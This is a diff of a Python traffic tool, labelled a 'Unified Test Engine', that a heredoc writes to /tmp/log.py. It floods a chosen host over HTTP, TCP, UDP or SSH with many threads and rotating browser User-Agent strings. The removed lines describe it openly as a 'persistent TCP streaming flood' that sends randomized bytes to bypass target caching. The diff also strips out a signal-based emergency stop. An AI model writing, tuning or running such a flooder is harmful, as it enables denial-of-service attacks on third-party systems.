@@ -1,3 +1,4 @@
+cat << 'EOF' > /tmp/log.py
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -7,8 +8,6 @@ import argparse
 import time
 import random
 import sys
-import os  # Injected for native, cryptographic high-speed hardware random byte blocks
-import signal  # Injected for native, instant multi-threaded process termination
 
 # ==========================================
 # VERSION COMPATIBILITY DETECTION & IMPORTS
@@ -28,7 +27,7 @@ CUSTOM_HEADERS = {}
 # =====================
 # CLI ARGUMENT PARSER
 # =====================
-parser = argparse.ArgumentParser(description="Unified Test Engine (Py2/Py3 Hybrid Optimized)")
+parser = argparse.ArgumentParser(description="Unified Test Engine (Py2/Py3 Hybrid)")
 
 parser.add_argument("-mode", required=True, choices=["http", "https", "tcp", "udp", "ssh"])
 parser.add_argument("-host", required=True)
@@ -48,7 +47,7 @@ HEADER_FILE = args.header_file
 PORT = args.port
 THREADS = args.threads
 DURATION = args.duration
-PAYLOAD_SIZE = args.size # Track size variable directly for dynamic runtime calculations
+PAYLOAD = b"A" * args.size if IS_PY3 else "A" * args.size
 
 running = True
 success = 0
@@ -57,19 +56,6 @@ total = 0
 latencies = []
 
 lock = threading.Lock()
-
-# =========================================================================
-# THE SAFETY VALVE: INSTANT GLOBAL ABORT PROCESS SIGNAL INTERCEPTOR
-# =========================================================================
-def emergency_stop_handler(signum, frame):
-    """Interceptors standard termination signals to instantly drop loop states."""
-    global running
-    running = False
-    sys.exit(0)
-
-# Register safety fences for both soft kill (SIGTERM) and interrupt commands (SIGINT)
-signal.signal(signal.SIGTERM, emergency_stop_handler)
-signal.signal(signal.SIGINT, emergency_stop_handler)
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -138,45 +124,32 @@ def http_worker():
         time.sleep(random.uniform(0.02, 0.08))
 
 def tcp_worker():
-    """High-efficiency persistent TCP streaming flood with un-cacheable raw data randomization."""
     global success, failed, total
     while running:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
+            s.settimeout(3)
+            start = time.time()
             s.connect((HOST, PORT))
-            
-            # Persistent internal flood loop keeps the socket locked open to avoid resource exhaustion
-            while running:
-                # Injects unique, randomized byte payloads on the fly to bypass target cache kernels
-                dynamic_payload = os.urandom(PAYLOAD_SIZE)
-                start = time.time()
-                s.sendall(dynamic_payload)
-                latency = time.time() - start
-                
-                with lock:
-                    total += 1
-                    success += 1
-                    latencies.append(latency)
+            s.sendall(PAYLOAD)
             s.close()
+            latency = time.time() - start
+            with lock:
+                total += 1
+                success += 1
+                latencies.append(latency)
         except:
             with lock:
                 total += 1
                 failed += 1
-            try: s.close()
-            except: pass
-            time.sleep(0.1) # Safe backoff prevents CPU spinning on connection drops
 
 def udp_worker():
-    """Maximizes unbuffered Layer 4 socket output with dynamic packet randomization."""
     global success, failed, total
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
     while running:
         try:
-            # Blast un-cacheable randomized bytes directly to the targets network stack
-            dynamic_payload = os.urandom(PAYLOAD_SIZE)
-            s.sendto(dynamic_payload, (HOST, PORT))
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(PAYLOAD, (HOST, PORT))
+            s.close()
             with lock:
                 total += 1
                 success += 1
@@ -184,8 +157,6 @@ def udp_worker():
             with lock:
                 total += 1
                 failed += 1
-    try: s.close()
-    except: pass
 
 def ssh_worker():
     global success, failed, total
@@ -219,7 +190,7 @@ def monitor():
     global running
     start = time.time()
     prev = 0
-    while time.time() - start < DURATION and running:
+    while time.time() - start < DURATION:
         time.sleep(1)
         with lock:
             rate = total - prev
@@ -234,7 +205,7 @@ def main():
     global PORT
     load_custom_headers()
     print("===================================")
-    print(" Unified Test Engine (Hybrid Optimized)")
+    print(" Unified Test Engine (Hybrid)")
     print("===================================")
     print("Mode     : " + str(MODE))
     print("Host     : " + str(HOST))
@@ -260,3 +231,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+EOF
